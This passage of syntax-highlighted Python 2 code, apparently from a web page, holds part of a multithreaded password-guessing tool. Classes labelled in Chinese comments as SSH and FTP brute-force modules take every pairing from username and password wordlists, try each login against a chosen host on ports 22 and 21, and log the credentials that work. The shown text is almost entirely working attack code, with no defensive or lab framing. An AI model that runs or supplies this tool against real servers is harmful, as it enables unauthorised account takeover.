&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> formatter &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>Formatter(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%(asctime)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(name)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(levelname)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(message)s&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch&lt;span style="color:#f92672">.&lt;/span>setFormatter(formatter)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger&lt;span style="color:#f92672">.&lt;/span>addHandler(ch)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">show_log&lt;/span>(self, lname, msg):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>getLogger(lname)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a&lt;span style="color:#f92672">.&lt;/span>debug(msg)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">show_result&lt;/span>(self, lname, rlist):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> rlist:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;###################################################################&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> rlist:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(lname,x)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;not found...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################SSH爆破模块#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SshBruter&lt;/span>(CommonFun):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for SshBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(SshBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self): 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>is_exit:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh &lt;span style="color:#f92672">=&lt;/span> paramiko&lt;span style="color:#f92672">.&lt;/span>SSHClient()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>set_missing_host_key_policy(paramiko&lt;span style="color:#f92672">.&lt;/span>AutoAddPolicy())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>connect(hostname&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>host,port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>,username&lt;span style="color:#f92672">=&lt;/span>name,password&lt;span style="color:#f92672">=&lt;/span>pwd,timeout&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>timeout)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.05&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################FTP爆破模块#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FtpBruter&lt;/span>(CommonFun):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for FtpBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(FtpBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp &lt;span style="color:#f92672">=&lt;/span> FTP()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>connect(self&lt;span style="color:#f92672">.&lt;/span>host, &lt;span style="color:#ae81ff">21&lt;/span>, self&lt;span style="color:#f92672">.&lt;/span>timeout)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>login(name, pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.05&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>quit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
